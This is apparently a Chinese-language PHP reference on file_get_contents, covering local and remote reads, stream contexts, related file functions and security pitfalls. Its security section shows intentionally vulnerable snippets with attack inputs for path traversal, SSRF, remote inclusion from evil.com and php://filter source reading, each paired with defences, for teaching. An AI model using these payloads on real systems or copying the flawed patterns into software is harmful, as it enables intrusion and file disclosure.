# file_get_contents - PHP 文件系统函数

> PHP 读取文件内容的核心函数，也可用于 HTTP 请求。

---

## 一、基本用法

### 1.1 读取本地文件

```php
// 读取整个文件到字符串
$content = file_get_contents('file.txt');
echo $content;

// 读取失败返回 false
$content = file_get_contents('nonexistent.txt');
if ($content === false) {
    echo '读取文件失败';
}

// 带错误抑制（不推荐，隐藏了问题）
$content = @file_get_contents('file.txt');
```

### 1.2 指定偏移和长度

```php
// 从第 10 字节开始读 50 字节
$content = file_get_contents('file.txt', false, null, 10, 50);

// 参数说明:
// 1. filename  - 文件名/URL
// 2. use_include_path - 是否在 include_path 中查找
// 3. context  - 流上下文
// 4. offset   - 起始偏移（字节）
// 5. maxlen   - 最大读取长度
```

### 1.3 include_path 中查找

```php
// 设为 true 时会在 include_path 中找文件
$content = file_get_contents('config.php', true);
```

---

## 二、读取远程文件

### 2.1 简单 HTTP GET

```php
// 需要 php.ini 中 allow_url_fopen = On
$html = file_get_contents('https://www.example.com');
echo $html;

// 获取 JSON API
$json = file_get_contents('https://api.example.com/users');
$data = json_decode($json, true);
print_r($data);
```

### 2.2 使用流上下文（自定义请求）

```php
// 自定义请求头
$context = stream_context_create([
    'http' => [
        'method' => 'GET',
        'header' => "Accept: application/json\r\n" .
                    "Authorization: Bearer token123\r\n" .
                    "User-Agent: MyApp/1.0\r\n",
        'timeout' => 10,  // 超时时间（秒）
        'ignore_errors' => true,  // 4xx/5xx 也返回内容
    ]
]);

$response = file_get_contents('https://api.example.com/data', false, $context);
```

### 2.3 POST 请求

```php
$data = ['name' => 'John', 'email' => 'john@example.com'];
$postData = http_build_query($data);

$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n" .
                    "Content-Length: " . strlen($postData) . "\r\n",
        'content' => $postData,
        'timeout' => 10,
    ]
]);

$response = file_get_contents('https://api.example.com/create', false, $context);
```

### 2.4 JSON POST

```php
$data = ['name' => 'John', 'age' => 30];
$jsonData = json_encode($data);

$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/json\r\n" .
                    "Accept: application/json\r\n",
        'content' => $jsonData,
        'timeout' => 10,
    ]
]);

$response = file_get_contents('https://api.example.com/api', false, $context);
$result = json_decode($response, true);
```

### 2.5 获取响应头

```php
// $http_response_header 是预定义变量，在 file_get_contents 后自动设置
$content = file_get_contents('https://example.com');

// 查看响应头
print_r($http_response_header);

// 获取状态码
if (isset($http_response_header[0])) {
    preg_match('/\d{3}/', $http_response_header[0], $matches);
    $status_code = $matches[0];
    echo "状态码: $status_code";
}

// 获取 Content-Type
foreach ($http_response_header as $header) {
    if (stripos($header, 'Content-Type:') === 0) {
        $contentType = trim(substr($header, 13));
        break;
    }
}
```

---

## 三、相关文件函数

### 3.1 其他文件读取方式

```php
// fopen + fread（更灵活，适合大文件）
$handle = fopen('file.txt', 'r');
if ($handle) {
    $content = fread($handle, filesize('file.txt'));
    fclose($handle);
}

// 逐行读取（省内存）
$handle = fopen('file.txt', 'r');
if ($handle) {
    while (($line = fgets($handle)) !== false) {
        echo $line;
    }
    fclose($handle);
}

// file() - 读入数组（每行一个元素）
$lines = file('file.txt');
foreach ($lines as $line) {
    echo $line;
}

// file() 跳过空行和去换行符
$lines = file('file.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// readfile - 直接输出文件到浏览器
readfile('file.txt');  // 输出内容并返回字节数
```

### 3.2 文件写入

```php
// file_put_contents - 写入文件
file_put_contents('file.txt', 'Hello World');

// 追加写入
file_put_contents('file.txt', "more text\n", FILE_APPEND);

// 加锁写入（防止并发写入冲突）
file_put_contents('file.txt', 'data', LOCK_EX);

// 追加+加锁
file_put_contents('file.txt', "log entry\n", FILE_APPEND | LOCK_EX);

// fwrite
$handle = fopen('file.txt', 'w');
fwrite($handle, 'Hello');
fclose($handle);
```

### 3.3 文件信息与检查

```php
// 文件是否存在
if (file_exists('file.txt')) {
    echo '文件存在';
}

// 是否是文件/目录
is_file('file.txt');   // 是普通文件
is_dir('/path');       // 是目录
is_link('link');       // 是符号链接

// 文件大小
filesize('file.txt');  // 字节数

// 可读/可写/可执行
is_readable('file.txt');
is_writable('file.txt');
is_executable('file.sh');

// 文件时间
filemtime('file.txt');  // 修改时间（时间戳）
fileatime('file.txt');  // 访问时间
filectime('file.txt');  // inode 修改时间

// 文件权限
fileperms('file.txt');  // 返回权限数值
```

---

## 四、安全相关内容

### 4.1 路径遍历攻击（Directory Traversal）

```php
/*
    路径遍历（目录穿越）攻击：
    用户通过 ../ 等方式访问预期外的文件
*/

// ===== 危险代码 =====
$file = $_GET['file'];
$content = file_get_contents('/var/www/files/' . $file);
// 攻击: ?file=../../etc/passwd
// 实际读取: /var/www/files/../../etc/passwd = /etc/passwd

// ===== 防御方法 =====

// 方法1：basename（只取文件名部分）
$file = basename($_GET['file']);  // 去掉路径部分
$content = file_get_contents('/var/www/files/' . $file);

// 方法2：realpath 验证
$baseDir = '/var/www/files/';
$filename = $_GET['file'];
$fullPath = realpath($baseDir . $filename);

if ($fullPath === false || strpos($fullPath, $baseDir) !== 0) {
    die('非法文件路径');
}

$content = file_get_contents($fullPath);

// 方法3：白名单
$allowedFiles = ['doc1.pdf', 'doc2.pdf', 'report.pdf'];
$file = $_GET['file'];

if (!in_array($file, $allowedFiles)) {
    die('文件不存在');
}

$content = file_get_contents('/var/www/files/' . $file);

// 方法4：正则验证文件名
if (!preg_match('/^[a-zA-Z0-9_\-]+\.pdf$/', $_GET['file'])) {
    die('非法文件名');
}
```

### 4.2 SSRF（服务端请求伪造）

```php
/*
    SSRF：当用户可以控制 file_get_contents 请求的 URL 时，
    攻击者可以让服务器访问内部网络资源
*/

// ===== 危险代码 =====
$url = $_GET['url'];
$content = file_get_contents($url);
// 攻击: ?url=file:///etc/passwd
// 攻击: ?url=http://127.0.0.1:3306/
// 攻击: ?url=http://192.168.1.1/admin

// ===== 防御方法 =====

// 方法1：禁用 allow_url_fopen（php.ini）
// allow_url_fopen = Off

// 方法2：白名单域名
$allowedHosts = ['api.example.com', 'cdn.example.com'];
$url = $_GET['url'];

$host = parse_url($url, PHP_URL_HOST);
if (!in_array($host, $allowedHosts)) {
    die('不允许的域名');
}

// 方法3：禁止内网 IP
function isInternalIp($ip) {
    // 检查是否是内网/保留地址
    $privateRanges = [
        ['10.0.0.0', '10.255.255.255'],
        ['172.16.0.0', '172.31.255.255'],
        ['192.168.0.0', '192.168.255.255'],
        ['127.0.0.0', '127.255.255.255'],
        ['169.254.0.0', '169.254.255.255'],
    ];
    
    $long = ip2long($ip);
    foreach ($privateRanges as $range) {
        if ($long >= ip2long($range[0]) && $long <= ip2long($range[1])) {
            return true;
        }
    }
    return false;
}

// 注意：DNS 重绑定攻击可能绕过 IP 检查
// 更好的做法是直接连接 IP 而不是域名
```

### 4.3 文件包含漏洞（file_get_contents 相关）

```php
/*
    file_get_contents 本身不会执行 PHP 代码
    但如果与 include/require 结合就危险了
*/

// ❌ 危险：用户控制 include 路径
include($_GET['page'] . '.php');
// 攻击: ?page=http://evil.com/shell
// 攻击: ?page=../../etc/passwd

// ✅ 安全：白名单
$pages = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';

if (!in_array($page, $pages)) {
    $page = 'home';
}

include __DIR__ . '/pages/' . $page . '.php';

// ===== PHP 封装协议 =====
/*
    PHP 支持各种协议/封装协议：
    file://    - 本地文件
    http://    - HTTP
    ftp://     - FTP
    php://     - PHP 内置流
      php://input    - 原始 POST 数据
      php://output   - 输出流
      php://filter   - 过滤器（可用于读取源码）
    data://    - Data URI
    phar://    - PHP 归档
    zip://     - ZIP 文件
*/

// php://filter 读取 PHP 源码（base64 编码）
// ?file=php://filter/convert.base64-encode/resource=config.php
// 这样就能看到 PHP 文件的源代码（base64 编码后）

// 防御：
// 1. 不要让用户控制完整路径
// 2. 白名单验证
// 3. 禁用不必要的协议（php.ini）
// allow_url_include = Off
```

### 4.4 安全的文件下载函数

```php
function safeDownload($filename) {
    // 基础目录（必须是绝对路径）
    $baseDir = '/var/www/downloads/';
    
    // 1. 规范化路径并验证
    $fullPath = realpath($baseDir . $filename);
    
    if ($fullPath === false) {
        header('HTTP/1.0 404 Not Found');
        die('文件不存在');
    }
    
    // 2. 确保在基础目录内
    if (strpos($fullPath, $baseDir) !== 0) {
        header('HTTP/1.0 403 Forbidden');
        die('禁止访问');
    }
    
    // 3. 检查是否是文件（不是目录）
    if (!is_file($fullPath)) {
        header('HTTP/1.0 404 Not Found');
        die('文件不存在');
    }
    
    // 4. 检查是否可读
    if (!is_readable($fullPath)) {
        header('HTTP/1.0 403 Forbidden');
        die('文件不可读');
    }
    
    // 5. 安全的文件名（防止 Content-Disposition 注入）
    $safeName = basename($fullPath);
    
    // 6. 发送下载头
    header('Content-Type: application/octet-stream');
    header('Content-Length: ' . filesize($fullPath));
    header('Content-Disposition: attachment; filename="' . $safeName . '"');
    
    // 7. 输出文件
    readfile($fullPath);
    exit;
}
```

---

## 五、常见错误与注意事项

| 错误/问题 | 原因 | 解决方案 |
|----------|------|---------|
| 返回 `false` | 文件不存在/权限不足 | 检查路径和权限 |
| 读取大文件内存溢出 | 一次性读入内存 | 用 fopen/fgets 逐行读取 |
| 远程文件读取失败 | `allow_url_fopen` 关闭 | 修改 php.ini 或用 cURL |
| 中文文件名乱码 | 编码问题 | 确保文件系统编码一致 |
| 路径穿越 | 用户可控路径 | basename + realpath 验证 |
| SSRF | 用户可控 URL | 白名单域名 + 禁止内网 IP |
| 竞争条件 | TOCTOU | 尽量减少检查和使用之间的时间差 |
